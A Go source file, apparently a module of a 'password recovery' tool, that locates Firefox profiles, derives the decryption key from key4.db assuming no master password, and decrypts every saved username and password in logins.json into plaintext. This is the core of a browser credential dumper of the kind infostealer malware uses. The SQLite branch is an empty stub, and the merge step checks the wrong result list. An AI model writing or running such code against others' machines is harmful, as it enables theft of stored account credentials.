package recovery_passwords

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"log"
	"regexp"
	"strings"
)

type Logins_mozilla struct {
	Id                   int
	Hostname             string
	HttpRealm            string
	FormSubmitURL        string
	UsernameFieid        string
	PasswordFiled        string
	Encryptedusername    string
	EncryptedPassword    string
	Guid                 string
	EncType              int
	TimeCreated          int
	TimeLastused         int
	TimePasswordChanaged int
	Timesused            int
}

type Logins_json struct {
	NextId        int
	Logins        []Logins_mozilla
	DisabledHosts []string
	Version       int
}

func GetMozillakey(FirefoxKey4File string) ([]byte, error) {
	var finallyKey []byte
	globalSalt, metaBytes, nssA11, nssA102, err := getDecryptKey(FirefoxKey4File)
	if err != nil {
		return nil, err
	}
	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
	meta, err := DecodeMeta(metaBytes)
	if err != nil {
		log.Println("decrypt meta data failed", err)
		return nil, err
	}
	var masterPwd []byte
	m, err := Meta(globalSalt, masterPwd, meta)
	if err != nil {
		log.Println("decrypt firefox failed", err)
		return nil, err
	}
	if bytes.Contains(m, []byte("password-check")) {
		log.Println("password-check success")
		m := bytes.Compare(nssA102, keyLin)
		if m == 0 {
			nss, err := DecodeNss(nssA11)
			if err != nil {
				return nil, err
			}
			log.Println("decrypt asn1 pbe success")
			finallyKey, err = Nss(globalSalt, masterPwd, nss)
			finallyKey = finallyKey[:24]
			if err != nil {
				return nil, err
			}
			log.Println("get firefox finally key success")
		}
	}

	return finallyKey, nil

}

func MozProfilePath(browser_path string) []string {
	log.Println(browser_path)
	result := []string{}
	browser_path_profiles := browser_path + "\\profiles.ini"
	exist_flag, _ := PathExists(browser_path_profiles)
	if exist_flag == true {
		file_text_bytes, err := ioutil.ReadFile(browser_path_profiles)
		if err == nil {
			file_text_str := string(file_text_bytes)
			regexp_str := regexp.MustCompile(`Path=([A-z0-9\\/\\.\\-]+)`)
			if regexp_str != nil {
				profiles_path_reg_list := regexp_str.FindAllStringSubmatch(file_text_str, -1)
				for _, profile_path_list := range profiles_path_reg_list {
					if len(profile_path_list) == 2 {
						result = append(result, browser_path+strings.Replace(profile_path_list[1], "/", "\\", -1))
					}
				}
			}
		}
	}
	return result
}

//signons.sqlite
func GetMozillaFromSQlite(profilePaths []string, applicationName string) []Logins_table_struct {
	result := []Logins_table_struct{}
	return result
}

func GetMozillaFromLogins(profilePaths []string, applicationName string) []Logins_table_struct {
	result := []Logins_table_struct{}
	var finallyKey []byte
	var err_finallyKey error
	for _, profile_path := range profilePaths {
		key4_db_paht := profile_path + "\\key4.db"
		exist_flag, _ := PathExists(key4_db_paht)
		if exist_flag == true {
			finallyKey, err_finallyKey = GetMozillakey(key4_db_paht)
		}
		logins_json_file := profile_path + "\\Logins.json"
		exist_flag, _ = PathExists(logins_json_file)
		if exist_flag == true {
			bytes, err := ioutil.ReadFile(logins_json_file)
			if err == nil {
				logins_json := &Logins_json{}
				err = json.Unmarshal(bytes, logins_json)
				if err == nil {
					logins_mozilla := logins_json.Logins
					for _, login_info := range logins_mozilla {
						logins_table_struct := Logins_table_struct{}
						logins_table_struct.Origin_url = login_info.Hostname
						logins_table_struct.Username_value = login_info.Encryptedusername
						logins_table_struct.Password_value = login_info.EncryptedPassword

						if err_finallyKey == nil {
							user_byte, err := base64.StdEncoding.DecodeString(logins_table_struct.Username_value)
							userPBE, _ := DecodeLogin(user_byte)
							user, err := Des3Decrypt(finallyKey, userPBE.Iv, userPBE.Encrypted)
							if err != nil {
								log.Println(err)
							} else {
								logins_table_struct.Username_value = string(PKCS5UnPadding(user))
							}
							password_byte, _ := base64.StdEncoding.DecodeString(logins_table_struct.Password_value)
							pwdPBE, _ := DecodeLogin(password_byte)
							pwd, err := Des3Decrypt(finallyKey, pwdPBE.Iv, pwdPBE.Encrypted)
							if err != nil {
								log.Println(err)
							} else {
								logins_table_struct.Password_value = string(PKCS5UnPadding(pwd))
							}
						}
						result = append(result, logins_table_struct)

					}
				}
			}
		}
	}
	return result
}

func Recovery_passwords_mozilla(browser_name, browser_path string) []Logins_table_struct {
	result := []Logins_table_struct{}
	profilePaths := MozProfilePath(browser_path)
	log.Println(profilePaths)
	if len(profilePaths) > 0 {
		result_logins := GetMozillaFromLogins(profilePaths, browser_path)
		if len(result_logins) > 0 {
			result = append(result, result_logins...)
		}
		result_sqlite := GetMozillaFromSQlite(profilePaths, browser_path)
		if len(result_logins) > 0 {
			result = append(result, result_sqlite...)
		}
	}
	return result
}

func Recovery_passwords_mozillas() map[string][]Logins_table_struct {
	browser_map := make(map[string]Browser_info)
	browser_map["Firefox"] = Browser_info{Browser_path: Appdata + "\\Mozilla\\Firefox\\", Need_to_recovery: true}
	result_map := make(map[string][]Logins_table_struct)
	for k, v := range browser_map {
		if v.Need_to_recovery == true {
			result := Recovery_passwords_mozilla(k, v.Browser_path)
			if len(result) > 0 {
				result_map[k] = result
			}
		}
	}
	return result_map
}
